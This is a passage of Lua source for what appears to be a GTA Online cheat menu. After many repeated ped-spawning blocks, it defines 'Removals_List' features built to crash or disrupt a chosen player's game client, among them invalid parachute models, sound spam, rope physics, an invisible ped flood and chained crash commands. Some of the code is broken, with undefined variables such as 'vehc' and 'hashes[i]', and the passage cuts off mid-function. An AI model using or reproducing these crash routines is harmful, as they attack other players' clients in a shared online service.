STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("a_f_y_juggalo_01")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("g_m_y_ballasout_01")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("u_m_m_markfost")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("a_m_y_gay_01")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("S_M_Y_DWService_01")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("a_m_m_farmer_01")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("s_m_y_construct_01")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("a_m_y_beach_02")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("s_m_y_garbage")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("g_m_y_armgoon_02")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("u_m_y_abner")
STREAMING.REQUEST_MODEL(mdl)
    util.yield()
    local old_ped = players.user_ped()
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
    PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
    util.yield(200)
    NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
    v3.free(pos)
------------------------------------------------------------------------------------------------------------
    end)
end)

menu.toggle_loop(Removals_List, "Bad Head Blend v2", {""}, "", function()
    local outfit_component_table = {}
    local outfit_component_texture_table = {}
    local outfit_prop_table = {}
    local outfit_prop_texture_table = {}
    for i = 0, 11 do
        outfit_component_table[i] = PED.GET_PED_DRAWABLE_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), i)
        outfit_component_texture_table[i] = PED.GET_PED_TEXTURE_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), i)
    end
    for i = 0, 2 do
        outfit_prop_table[i] = PED.GET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), i)
        outfit_prop_texture_table[i] = PED.GET_PED_PROP_TEXTURE_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), i)
    end
    BlockSyncs(pid, function()
        local time = (util.current_time_millis() + 5000)
        while time > util.current_time_millis() do
            util.yield(10)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 17, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 1, 55, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 2, 40, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 3, 44, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 4, 31, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 5, 0, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 6, 24, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 7, 110, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 8, 55, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 9, 9, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 10, 45, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 11, 69, math.random(0, 50), 0)
            PED.SET_PED_HEAD_BLEND_DATA(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
        end
        util.yield(200)
        for i = 0, 11 do
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), i, outfit_component_table[i], outfit_component_texture_table[i], 0)
        end
        for i = 0, 2 do
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), i, outfit_prop_table[i], outfit_prop_texture_table[i], 0)
        end
        util.toast("Finished")
    end)
end)


local ents = {}
local thingy = false
    
    menu.toggle(Removals_List, "Muscle", {}, "", function(val,cl)
        thingy = val
        BlockSyncs(pid, function()
            if val then
                local number_of_things = 30
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped_pos = ENTITY.GET_ENTITY_COORDS(ply_ped)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i=1,number_of_things do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS", 0, false)  
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("ig_siemonyetarian") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (thingy and players.exists(pid))
                thingy = false
                for k, obj in ents do
                    entities.delete_by_handle(obj)
                end
                ents = {}
            else
                for k, obj in ents do
                    entities.delete_by_handle(obj)
                end
                ents = {}
            end
        end)
    end)

menu.toggle_loop(Removals_List, "Parachute Mismatch", {"paragone"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    BlockSyncs(pid, function()
        util.yield(500)

        local crash_parachute = util.joaat("prop_logpile_06b")
        local parachute = util.joaat("p_parachute1_mp_dec")

        STREAMING.REQUEST_MODEL(crash_parachute)
        STREAMING.REQUEST_MODEL(parachute)

        for i = 1, 3 do
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(pid, crash_parachute)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
        end

        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(pid, parachute)
        util.yield(500)
    end)
end)

menu.toggle(Removals_List, "Parachute Mismatch v2", {"chutemodel"}, "", function(toggle)
    local veh = entities.get_user_vehicle_as_handle()
    local model = util.joaat("apa_mp_apa_yacht")
    local normal_model = util.joaat("imp_prop_impexp_para_s")
    if toggle then
        BlockSyncsExcept(pid, true)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(entities.get_user_vehicle_as_handle(), util.joaat("apa_mp_apa_yacht"))
    else
        util.yield()
        BlockSyncsExcept(pid, false)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY()
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(veh, normal_model)
        util.toast("Parachute Returned To Normal")
    end
end)

menu.toggle_loop(Removals_List, "UDPMIX", {"mix"}, "", function()
    menu.trigger_commands("potatomode on")
    menu.trigger_commands("trafficpotato on")
    util.toast("Starting...")
    menu.trigger_commands("crash" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("smash" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("choke" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("flashcrash" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("ngcrash" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("steamroll" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("footlettuce" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("choke" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("smash" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("crashv5" .. players.get_name(pid))
    util.yield(800)
    menu.trigger_commands("rcleararea")
    menu.trigger_commands("potatomode off")
    menu.trigger_commands("trafficpotato off")
    util.yield(1000)
    menu.trigger_commands("anticrashcamera off")
end)


menu.click_slider(Removals_List, "Global Crash", {"soundcrash"}, "", 1, 4, 1, 1, function(slider)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local time = util.current_time_millis() + 2000
    if slider == 1 then
        while time > util.current_time_millis() do
            for i = 1, 5 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ROUND_ENDING_STINGER_CUSTOM", pos.x, pos.y, pos.z, "CELEBRATION_SOUNDSET", true, 999999999, false)
            end
            util.yield()
        end
    elseif slider == 2 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '10s', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 999999999, false)
            end
        util.yield()
    end
    elseif slider == 3 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Oneshot_Final', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 999999999, false)
            end
        util.yield()
    end
    elseif slider == 4 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", pos.x, pos.y, pos.z, "MP_MISSION_COUNTDOWN_SOUNDSET", true, 999999999, false)
            end
            util.yield()
        end
    end
end)

menu.click_slider(Removals_List, "Controlled Crash", {"soundcrash2"}, "", 1, 3, 1, 1, function(slider)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local time = util.current_time_millis() + 2000
    if slider == 1 then
        while time > util.current_time_millis() do
            for i = 1, 5 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Object_Dropped_Remote", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
        util.yield()
    end
    elseif slider == 2 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Checkpoint_Cash_Hit", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
        util.yield()
    end
    elseif slider == 3 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
            util.yield()
        end
    end
end)

menu.action(Removals_List, "Rope Crash No Notification", {""}, "", function (pid)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
end)

menu.action(Removals_List,"R0 Crash", {""} ,"" , function(pid)
    local pos = players.get_position(pid)
